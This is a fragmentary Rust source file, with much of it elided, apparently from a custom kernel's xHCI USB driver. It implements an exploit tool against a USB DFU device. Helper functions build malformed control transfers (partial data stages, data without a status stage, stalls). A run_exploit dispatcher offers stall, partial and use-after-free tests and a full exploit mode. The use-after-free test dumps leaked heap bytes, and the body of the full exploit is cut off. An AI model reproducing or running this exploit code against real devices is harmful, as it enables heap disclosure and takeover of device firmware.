...
use super::xhci::{
    self, Trb, XhciController, XhciCapRegs, XhciPortRegs, XhciIntrRegs, XhciDevice,
    phys_to_virt, CONTROLLER, INITIALIZED,
    // TRB types
...
const DFU_IN: u8 = USB_DIR_IN | USB_TYPE_CLASS | USB_RECIP_INTERFACE; // 0xA1
...
fn make_data_trb(buf_phys: u64, length: u32, direction_in: bool) -> Trb {
    Trb {
        parameter: buf_phys,
        status: length,
...
fn poll_event(controller: &mut XhciController, max_iters: u32) -> Option<(u8, u32, u8)> {
    for _ in 0..max_iters {
        ...
        if phase == controller.event_cycle {
            ...
            unsafe {
                (*intr_regs).erdp = erdp_phys | (1 << 3); // EHB
            }
...
fn full_control_in(
    ...
    // Enqueue Setup + Data IN + Status OUT
    {
        ...
        if w_length > 0 {
            let data = make_data_trb(buf_phys, w_length as u32, true);
...
fn full_control_out(
...
) -> Option<u32> {
    {
        ...
        if w_length > 0 {
            let data = make_data_trb(buf_phys, w_length as u32, false);
            sr.ep0.enqueue_trb(data);
        }
...
fn dfu_getstatus(controller: &mut XhciController, slot_id: u8) -> Option<(u8, u8)> {
    ...
    let result = full_control_in(controller, slot_id, DFU_IN, DFU_GETSTATUS, 0, 0, 6, buf_phys);
    let ret = if result.is_some() {
        let b_status = unsafe { ptr::read_volatile(buf_virt as *const u8) };
        let b_state = unsafe { ptr::read_volatile((buf_virt + 4) as *const u8) };
        Some((b_status, b_state))
    } else {
        None
    };
    free_dma_page(buf_phys);
    ret
}
...
fn dfu_abort(controller: &mut XhciController, slot_id: u8) -> bool {
    {
        let mut rings = super::xhci::SLOT_RINGS.lock();
        let sr = match rings.get_mut(slot_id as usize).and_then(|r| r.as_mut()) {
            Some(r) => r,
            None => return false,
        };
...
fn dfu_dnload(controller: &mut XhciController, slot_id: u8, data: &[u8]) -> Option<u8> {
    ...
    unsafe {
        ptr::copy_nonoverlapping(data.as_ptr(), buf_virt as *mut u8, len as usize);
    }
    let result = full_control_out(controller, slot_id, DFU_OUT, DFU_DNLOAD, 0, 0, len, buf_phys);
    free_dma_page(buf_phys);
...
fn dfu_upload(controller: &mut XhciController, slot_id: u8, buf: &mut [u8]) -> Option<u32> {
    ...
    let result = full_control_in(controller, slot_id, DFU_IN, DFU_UPLOAD, 0, 0, len, buf_phys);
    if let Some(transferred) = result {
        let copy_len = (transferred as usize).min(buf.len());
        unsafe {
            ptr::copy_nonoverlapping(buf_virt as *const u8, buf.as_mut_ptr(), copy_len);
        }
    }
    free_dma_page(buf_phys);
    result
...
fn setup_partial_data(
    ...
    let (buf_phys, buf_virt) = alloc_dma_page()?;
    let actual_len = actual_data.len().min(4096);
    unsafe {
        ptr::copy_nonoverlapping(actual_data.as_ptr(), buf_virt as *mut u8, actual_len);
    }

    {
        ...
        let sr = match rings.get_mut(slot_id as usize).and_then(|r| r.as_mut()) {
            Some(r) => r,
            None => { free_dma_page(buf_phys); return None; },
        };
        ...
        let mut data = make_data_trb(buf_phys, actual_len as u32, false); // OUT
...
fn setup_data_no_status(
    ...
    unsafe {
        ptr::copy_nonoverlapping(data.as_ptr(), buf_virt as *mut u8, len);
    }

    {
        ...
        let mut data_trb = make_data_trb(buf_phys, len as u32, false);
...
fn is_device_connected(controller: &mut XhciController, port_num: u8) -> bool {
    ...
    let port_regs = (port_base + ((port_num as u64 - 1) * 16)) as *mut XhciPortRegs;
    let portsc = unsafe { (*port_regs).portsc };
    (portsc & PORTSC_CCS) != 0
}
...
pub fn run_exploit(args: &str) -> String {
    ...
    // Find DFU device
    let slot_id = match find_dfu_slot() {
        Some(s) => s,
        None => {
    ...
    match args.trim() {
        ...
        "stall" | "st" => cmd_test_stall(&mut output, slot_id, port_num),
        "partial" | "p" => cmd_test_partial(&mut output, slot_id, port_num),
        "uaf" | "u" => cmd_test_uaf(&mut output, slot_id, port_num),
        "exploit" | "e" | "go" => cmd_full_exploit(&mut output, slot_id, port_num),
        "help" | "h" | "" => {
...
fn cmd_test_stall(output: &mut String, slot_id: u8, port_num: u8) {
...
fn cmd_test_partial(output: &mut String, slot_id: u8, port_num: u8) {
...
fn cmd_test_uaf(output: &mut String, slot_id: u8, port_num: u8) {
    ...
    for leak_rounds in &[1u32, 5, 10] {
        ...
        let mut up_buf = [0u8; 0x800];
        if let Some(up_len) = dfu_upload(controller, slot_id, &mut up_buf) {
            let nonzero = up_buf.iter().take(up_len as usize).any(|&b| b != 0);
            output.push_str(&format!("  6. UPLOAD: {}B, nonzero={}\n", up_len, nonzero));
            if nonzero {
                output.push_str("  *** HEAP DATA LEAKED! ***\n");
                output.push_str("  First 64 bytes: ");
                for b in up_buf.iter().take(64) {
...
fn cmd_full_exploit(output: &mut String, slot_id: u8, port_num: u8) {
